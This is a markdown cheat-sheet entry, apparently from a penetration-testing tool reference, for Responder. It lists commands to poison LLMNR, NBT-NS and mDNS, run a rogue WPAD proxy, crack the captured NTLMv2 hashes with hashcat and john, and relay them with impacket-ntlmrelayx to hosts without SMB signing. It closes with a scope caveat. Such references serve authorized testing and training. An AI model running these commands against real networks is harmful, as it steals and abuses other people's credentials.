---
name: Responder
category: Service Enumeration
description: LLMNR, NBT-NS and mDNS poisoning to capture NTLMv1/v2 hashes.
tags: [llmnr, nbtns, mdns, ntlm, poisoning, mitm]
---

# Responder

**Responder** poisons LLMNR, NBT-NS and mDNS name resolution on the local network. When a Windows host looks up a name that DNS can't resolve, Responder answers and captures the victim's NTLMv1/v2 authentication hashes — often the first foothold on an internal network.

> `apt install responder` · [github.com/lgandx/Responder](https://github.com/lgandx/Responder) · run as root, on-link

## Basic run

```bash
sudo responder -I eth0                     # listen/poison on interface eth0
sudo responder -I eth0 -wv                  # WPAD rogue proxy + verbose
sudo responder -I eth0 -A                    # analyze only (passive, no poisoning)
```

## Key flags

| Flag | Purpose |
|------|---------|
| `-I` | Interface |
| `-A` | Analyze mode (observe, don't poison) |
| `-w` | Start rogue WPAD proxy |
| `-v` | Verbose |
| `-F` | Force NTLM/Basic auth on WPAD |
| `-d` | Answer DHCP requests (advanced) |

## Where the hashes go

Captured hashes are logged live and saved under:

```bash
ls /usr/share/responder/logs/            # SMB-NTLMv2-SSP-<ip>.txt
```

Crack them offline:

```bash
hashcat -m 5600 hashes.txt rockyou.txt    # NetNTLMv2
john --format=netntlmv2 hashes.txt
```

## Relay instead of crack

If SMB signing is **not enforced**, relay the captured auth with impacket instead of cracking:

```bash
# Turn OFF Responder's SMB/HTTP servers first (Responder.conf: SMB = Off, HTTP = Off)
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Find relay targets:

```bash
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt   # hosts without SMB signing
```

> Start with `-A` to understand the environment before poisoning. This is loud and impactful — internal engagements only, within scope. Combine with [NetExec](#/tool/netexec) and [impacket](#/tool/impacket).
